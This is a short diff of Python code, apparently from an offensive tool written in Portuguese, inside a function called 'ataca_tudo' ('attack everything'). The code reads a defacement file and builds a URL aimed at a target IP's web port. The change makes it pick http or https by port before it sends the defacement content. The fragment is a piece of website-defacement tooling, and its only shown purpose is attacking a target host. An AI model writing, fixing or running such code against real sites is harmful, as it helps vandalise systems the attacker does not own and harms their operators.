@@ -536,8 +536,8 @@ def ataca_tudo():
             with open(deface_file, "r") as f:
                 deface_content = f.read()
 
-            # ===== CORREÇÃO: FORÇAR O IP CORRETO =====
-            url_deface = f"https://{ip_alvo}:{porta_web_real}/deface"
+            protocolo_deface = "https" if porta_web_real in ["443", "8443"] else "http"
+            url_deface = f"{protocolo_deface}://{ip_alvo}:{porta_web_real}/deface"
             print(f"[*] A enviar deface para: {url_deface}")
 
             try:
